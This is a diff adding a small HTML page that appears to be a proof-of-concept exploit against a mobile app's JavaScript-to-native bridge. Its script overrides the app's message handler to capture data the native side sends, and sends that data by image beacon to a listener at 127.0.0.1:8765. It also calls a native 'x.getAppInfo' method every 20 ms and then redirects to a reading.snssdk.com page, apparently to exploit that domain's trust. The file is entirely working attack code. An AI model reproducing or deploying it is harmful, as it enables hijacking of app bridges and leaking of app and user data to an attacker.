@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>HG_C1B</title>
+</head>
+<body>
+<pre id="out">c1b</pre>
+<script>
+var BEACON = "http://127.0.0.1:8765/c1?";
+function ping(s) {
+  try { new Image().src = BEACON + encodeURIComponent(s).slice(0, 800); } catch (e) {}
+}
+window.JSBridge = {
+  _handleMessageFromApp: function (msg) {
+    var s;
+    try { s = JSON.stringify(msg); } catch (e) { s = String(msg); }
+    ping(s);
+  }
+};
+ping("boot");
+var n = 0;
+setInterval(function () {
+  n++;
+  if (!window.JS2NativeBridge) return;
+  try {
+    JS2NativeBridge._invokeMethod(JSON.stringify({
+      func: "x.getAppInfo",
+      params: {},
+      __callback_id: "b" + n
+    }));
+  } catch (e) {}
+}, 20);
+setTimeout(function () {
+  ping("nav");
+  location.href = "https://reading.snssdk.com/reading_offline/drlazy/page/general-rules.html?title=c1b";
+}, 400);
+</script>
+</body>
+</html>
